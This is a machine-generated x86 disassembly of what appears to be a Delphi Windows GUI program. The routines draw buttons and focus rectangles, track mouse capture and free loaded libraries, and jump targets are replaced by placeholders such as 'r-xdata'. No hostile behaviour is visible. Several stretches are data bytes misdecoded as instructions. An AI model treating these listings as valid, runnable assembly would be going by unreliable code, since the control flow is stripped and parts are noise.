mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44aa28
sub_42edb8
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42ee41
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43e14c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455380
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_40348c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee48
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_42ee84
push ebx
push esi
mov esi eax
mov eax esi
call sub_43feac
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_4301bc
call sub_43029c
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42eef8
push ebx
push esi
mov esi eax
mov eax esi
call sub_43fec4
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_4301bc
call sub_43029c
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42ef60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42eb10
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_421c54
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41cf14
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_421c54
pop edx
call sub_41d2ec
push 0x0
push edi
push 0x1
mov eax ebx
call sub_421c54
mov edx eax
xor ecx ecx
mov eax esi
call sub_44bdac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42eff0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_440054
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_42ec38
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42eb10
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44b894
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42ef60
pop ecx
sub_42f090
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d4a0
mov [ edi + 0x21c ] eax
mov eax [ edi + 0x21c ]
mov [ eax + 0x2c ] edi
mov [ eax + 0x28 ] sub_42f6f8
mov ecx esi
xor edx edx
mov eax edi
call sub_435550
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov [ edi + 0x218 ] eax
mov [ edi + 0x220 ] 0x0
mov [ edi + 0x221 ] 0x0
mov [ edi + 0x222 ] 0x0
mov [ edi + 0x224 ] 0x4
mov [ edi + 0x228 ] 0xffffffff
mov eax [ edi + 0x50 ]
or eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov [ edi + 0x1f8 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_42f140
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4407b8
mov eax [ esi + 0x21c ]
call sub_403290
mov eax [ esi + 0x218 ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_42f17c
push ebx
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_441e08
mov edx ebx
mov eax [ esi + 0x21c ]
call sub_42d6a4
pop esi
pop ebx
retn
sub_42f1cc
push ebx
mov ebx eax
mov al [ ebx + 0x221 ]
sub al 0x3
je r-xdata
mov eax ebx
jmp r-xdata
sub al 0x3
jne r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_4355b4
mov eax ebx
call sub_4553f0
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x158 ] 0x0
je r-xdata
mov eax ebx
call sub_4355b4
pop ebx
retn
call sub_45a9fc
jmp r-xdata
mov eax ebx
call sub_4355b4
pop ebx
retn
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x158 ]
xchg edx eax
call sub_45e634
jmp r-xdata
mov eax [ eax + 0x30 ]
pop ebx
retn
sub_42f254
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_42f66e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x18 ]
mov eax [ edi + 0x218 ]
call sub_41d800
lea edx [ ebp - 0x20 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ esi + 0x18 ]
mov eax [ edi + 0x218 ]
call sub_41d800
mov edx [ edi + 0x68 ]
mov eax [ edi + 0x218 ]
call sub_41d67c
mov eax [ esi + 0x10 ]
test al 0x1
setne bl
test al 0x10
setne [ ebp - 0x1 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
test bl bl
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x0
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
call sub_4301bc
call sub_43029c
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov [ ebp - 0x8 ] 0x2010
test bl bl
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
test [ esi + 0x10 ] 0x4
je r-xdata
or [ ebp - 0x8 ] 0x200
test bl bl
je r-xdata
mov bl 0x5
jmp r-xdata
mov al [ edi + 0x22c ]
or al [ ebp - 0x1 ]
je r-xdata
or [ ebp - 0x8 ] 0x100
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov bl 0x4
jmp r-xdata
call sub_4301bc
lea ecx [ ebp - 0x2c ]
mov edx ebx
call sub_430500
lea eax [ ebp - 0x2c ]
push eax
push 0x1
push 0x0
mov eax edi
call sub_444968
push eax
call sub_4301bc
mov ecx [ esi + 0x18 ]
pop edx
call sub_430434
lea eax [ esi + 0x1c ]
push eax
push 0x0
call sub_4301bc
mov edx [ esi + 0x18 ]
lea ecx [ ebp - 0x2c ]
call sub_4303a8
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x218 ]
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x2c ]
pop edx
call sub_43030c
cmp bl 0x4
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000006
call sub_41cc14
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41cd40
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d030
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax [ edi + 0x218 ]
call sub_41d428
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call InflateRect
mov al [ edi + 0x22c ]
or al [ ebp - 0x1 ]
je r-xdata
mov bl 0x3
jmp r-xdata
lea ecx [ ebp - 0x10 ]
xor edx edx
xor eax eax
call sub_412618
lea ecx [ ebp - 0x10 ]
xor edx edx
mov eax 0x1
call sub_412618
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x20 ]
push eax
mov eax [ esi + 0x18 ]
push eax
call DrawFrameControl
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41cc14
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41cd40
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax [ edi + 0x218 ]
call sub_41d428
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call InflateRect
jmp r-xdata
mov bl 0x2
mov bl 0x6
jmp r-xdata
xor edx edx
mov eax [ edi + 0x218 ]
call sub_41d800
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f675
lea eax [ ebp - 0x4c ]
call sub_403fe0
lea eax [ ebp - 0x40 ]
call sub_403fe0
retn
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000006
call sub_41cc14
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x218 ]
call sub_41d780
push eax
call DrawFocusRect
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax edi
call sub_43e14c
mov eax [ ebp - 0x40 ]
push eax
mov al [ edi + 0x222 ]
push eax
mov eax [ edi + 0x228 ]
push eax
mov eax [ edi + 0x224 ]
push eax
mov al [ ebp - 0x2 ]
push eax
push 0x0
xor edx edx
mov eax edi
call sub_440460
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx [ edi + 0x218 ]
mov eax [ edi + 0x21c ]
call sub_42e1ec
mov al [ edi + 0x22c ]
and al [ ebp - 0x1 ]
je r-xdata
mov edx [ edi + 0x68 ]
mov eax [ edi + 0x218 ]
call sub_41d67c
test bl bl
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call InflateRect
cmp [ edi + 0x22c ] 0x0
je r-xdata
lea ecx [ ebp - 0x48 ]
xor edx edx
xor eax eax
call sub_412618
lea eax [ ebp - 0x48 ]
push eax
lea edx [ ebp - 0x4c ]
mov eax edi
call sub_43e14c
mov eax [ ebp - 0x4c ]
push eax
mov al [ edi + 0x222 ]
push eax
mov eax [ edi + 0x228 ]
push eax
mov eax [ edi + 0x224 ]
push eax
mov al [ ebp - 0x2 ]
push eax
push 0x0
xor edx edx
mov eax edi
call sub_440460
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx [ edi + 0x218 ]
mov eax [ edi + 0x21c ]
call sub_42e1ec
mov al [ edi + 0x22c ]
and al [ ebp - 0x1 ]
je r-xdata
push 0x1
push 0x1
lea eax [ ebp - 0x20 ]
push eax
call OffsetRect
lea edx [ ebp - 0x20 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xfffffffc
push 0xfffffffc
lea eax [ ebp - 0x20 ]
push eax
call InflateRect
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000006
call sub_41cc14
mov eax [ edi + 0x218 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x218 ]
call sub_41d780
push eax
call DrawFocusRect
sub_42f728
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42f824
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ esi + 0x221 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f82b
lea eax [ ebp - 0x8 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
test bl bl
je r-xdata
mov [ esi + 0x221 ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
sub al 0x1
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
xor edx edx
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43e14c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_435630
mov eax ebx
sub al 0x2
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov [ esi + 0x214 ] eax
mov eax ebx
call sub_42d070
mov edx eax
mov eax [ esi + 0x21c ]
call sub_42d604
mov dl 0x2
mov eax esi
call sub_42f93c
mov [ esi + 0x22d ] 0x0
xor eax eax
mov al bl
mov edi [ eax * 4 + rw-data ]
test edi edi
je r-xdata
mov [ esi + 0x211 ] al
test [ esi + 0x1c ] 0x1
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_405b10
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43e17c
sub_42f834
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42f89f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
xor eax eax
mov al [ ebx + 0x221 ]
mov eax [ eax * 4 + rw-data ]
call sub_405b10
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x8 ]
pop edx
call sub_407d70
test eax eax
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f8a6
lea eax [ ebp - 0x8 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_42f8b0
cmp [ eax + 0x221 ] 0x0
je r-xdata
mov al [ eax + 0x221 ]
retn
mov dl [ eax + 0x221 ]
mov ecx edx
sub cl 0x1
je r-xdata
mov cl 0x1
sub cl 0x3
je r-xdata
mov [ eax + 0x221 ] 0x0
mov ecx edx
sub cl 0x2
je r-xdata
xor ecx ecx
jmp r-xdata
mov cl 0x1
sub cl 0x3
je r-xdata
xor cl [ eax + 0x210 ]
jne r-xdata
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
cmp edx [ eax + 0x214 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ eax + 0x22d ] 0x0
je r-xdata
xor cl [ eax + 0x211 ]
jne r-xdata
sub_42f93c
push ebx
mov ebx eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ ebx + 0x21c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop ebx
retn
call sub_42d67c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f998
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42f6ec
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_421c54
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41cf14
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_421c54
pop edx
call sub_41d2ec
push 0x0
push edi
push 0x1
mov eax ebx
call sub_421c54
mov edx eax
xor ecx ecx
mov eax esi
call sub_44bdac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fa28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4353b0
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42f6ec
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ ebx + 0x80 ] 0x0
jl r-xdata
mov esi ebx
mov eax [ esi + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44b894
cmp eax [ esi + 0x80 ]
jle r-xdata
push ebp
mov eax ebx
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42f998
pop ecx
sub_42fac4
push esi
mov esi eax
mov eax esi
call sub_43feac
call sub_4301bc
call sub_43029c
test al al
je r-xdata
pop esi
retn
cmp [ esi + 0x22e ] 0x0
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov [ esi + 0x22e ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_42fb00
push esi
mov esi eax
mov eax esi
call sub_43fec4
call sub_4301bc
call sub_43029c
test al al
je r-xdata
pop esi
retn
cmp [ esi + 0x22e ] 0x0
je r-xdata
mov [ esi + 0x22e ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_42fb34
or al [ eax ]
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x29 ] ah
inc edi
add [ eax + 0x30 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x47 ] bl
add [ edx + esi + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x29 ] bl
inc edi
add [ eax + 0x4730 ] dh
add [ eax ] al
add [ ecx + ebp + 0x47 ] dl
add [ eax ] dh
xor [ edi ] eax
add [ eax ] al
add [ eax ] al
push eax
sub [ edi ] eax
xor al [ fs : edi ]
add [ eax ] al
add [ eax ] al
dec esp
sub [ edi ] eax
fsubr [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42fbdc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
inc edi
add [ eax + esi + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x47 ] ch
add [ edi + ebp ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x29 ] ch
inc edi
add [ eax + 0x472e ] bh
add [ eax ] al
add [ ecx + ebp + 0x47 ] ah
add [ eax + 0x472f ] ch
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fbe3
retn
call sub_42faa8
sub_42fc10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fc35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc3c
retn
sub_42fc57
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42fc9c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fca3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a68
sub_42fcbf
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42fd04
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd0b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a68
sub_42fd1b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fd71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd78
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403fe0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42fd84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fdc8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fdcf
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42fddc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fe01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fe08
retn
sub_42fe14
pushad
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x40042fe
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add ah ch
inc [ edx ]
add bh bh
inc edx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_42ff83
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff8a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a1c
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a1c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42ff14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ff83
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff8a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a1c
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a1c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4301dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_425ce4
mov [ esi + 0x5 ] al
call sub_42feb4
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_430b54
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_430228
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_4302c8
call sub_425b24
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_43025c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_4302c8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43030c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43025c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43035c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
